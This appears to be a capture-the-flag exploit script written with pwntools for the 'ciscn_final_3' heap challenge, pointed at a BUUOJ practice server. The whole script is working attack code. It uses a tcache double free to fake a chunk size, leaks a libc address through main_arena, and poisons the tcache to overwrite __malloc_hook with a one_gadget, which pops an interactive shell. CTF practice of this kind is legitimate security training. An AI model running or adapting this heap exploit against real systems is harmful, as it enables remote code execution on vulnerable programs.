from pwn import *

#p = process('./ciscn_final_3')
p = remote('node4.buuoj.cn', 29920)

libc = ELF('libc.buu.so') #ELF('libc-2.27.so')

def alloc(index, size, content):
	p.sendlineafter(b'choice > ', b'1')
	p.sendlineafter(b'input the index\n', str(index).encode())
	p.sendlineafter(b'input the size\n', str(size).encode())
	p.sendafter(b'something\n', content)
	p.recvuntil(b'gift :')
	return int(p.recvline()[2:],16)

def delete(index):
	p.sendlineafter(b'choice > ', b'2')
	p.sendlineafter(b'input the index\n', str(index).encode())

chunk0 = alloc(0, 0x78, b'a')

alloc(1, 0x18, b'\0')#1
alloc(2, 0x78, b'\0')#2
alloc(3, 0x78, b'\0')#3
alloc(4, 0x78, b'\0')#4
alloc(5, 0x78, b'\0')#5
alloc(6, 0x78, b'\0')#6
alloc(7, 0x78, b'\0')#7
alloc(8, 0x78, b'\0')#8
alloc(9, 0x78, b'\0')#9
alloc(10, 0x78, b'\0')#10
alloc(11, 0x78, b'\0')#11
alloc(12, 0x28, b'\0')#12

#double free override size of chunk0
delete(12)
delete(12)
alloc(13, 0x28, p64(chunk0 - 0x8))
alloc(14, 0x28, p64(chunk0 - 0x8))
alloc(15, 0x28, p64(0x421))

delete(0)
delete(1)

alloc(16, 0x78, b'\0')
alloc(17, 0x18, b'\0')
main_arena = alloc(18, 0x18, b'\0') - 96
malloc_hook = main_arena - 0x10
print('[+] main_arena -> {}'.format(hex(main_arena)))

libc_base = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc_base + 0x10a38c #0x10a45c

print('[+] libc_base -> {}'.format(hex(libc_base)))

delete(7)
delete(7)
alloc(19, 0x78, p64(malloc_hook))
alloc(20, 0x78, p64(malloc_hook))
alloc(21, 0x78, p64(one_gadget))

p.sendlineafter(b'choice > ', b'1')
p.sendlineafter(b'input the index\n', b'22')
p.sendlineafter(b'input the size\n', b'10')

p.interactive()

pause()
